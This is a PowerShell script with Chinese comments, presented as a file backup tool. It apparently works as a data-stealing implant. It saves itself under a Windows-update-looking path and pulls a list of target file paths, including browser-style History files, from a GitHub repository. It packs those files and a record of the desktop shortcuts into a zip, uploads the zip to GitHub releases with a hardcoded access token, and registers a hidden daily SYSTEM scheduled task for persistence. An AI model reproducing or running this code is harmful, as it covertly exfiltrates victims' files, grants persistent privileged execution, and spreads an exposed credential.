# === 基本设置 ===
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$logPath = "C:\ProgramData\upload_log.txt"
$token = "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"  # ✅ 替换为你自己的 GitHub Token
$repo = "drftghy/backup-files"

# 输出编码设置
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

"[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append

# === 下载自身脚本副本 ===
try {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
    "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
} catch {
    "❌ Failed to download install.ps1: $($_.Exception.Message)" | Out-File $logPath -Append
    return
}

# === 收集文件并上传 ===
try {
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName
    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

    # 读取远程路径列表
    $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }

    $index = 0
    foreach ($path in $pathList) {
        $index++
        $name = "item$index"
        if (-not (Test-Path $path)) { continue }
        $dest = Join-Path $tempRoot $name

        try {
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                $srcDir = Split-Path $path
                robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dest -Recurse -Force
            } else {
                Copy-Item $path -Destination $dest -Force
            }
        } catch {
            "❌ Copy failed: $path - $($_.Exception.Message)" | Out-File $logPath -Append
        }
    }

    # 提取桌面快捷方式
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTarget: $($shortcut.TargetPath)`nArgs: $($shortcut.Arguments)`nStartIn: $($shortcut.WorkingDirectory)`nIcon: $($shortcut.IconLocation)`n-----------`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        "⚠️ LNK info failed: $($_.Exception.Message)" | Out-File $logPath -Append
    }

    # 压缩
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force

    # 创建 Release
    $releaseData = @{
        tag_name = $tag
        name = $releaseName
        body = "Auto file package from $computerName on $date"
        draft = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent" = "PowerShellScript"
        Accept = "application/vnd.github.v3+json"
    }

    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"

    # 上传文件
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    } -Body $fileBytes

    "[OK] Upload successful." | Out-File $logPath -Append
} catch {
    "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# === 注册每天凌晨 0 点运行的任务 ===
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        "[OK] Existing task removed." | Out-File $logPath -Append
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
    "[OK] Scheduled task registered (0:00)." | Out-File $logPath -Append
} catch {
    "❌ Scheduled task creation failed: $($_.Exception.Message)" | Out-File $logPath -Append
}
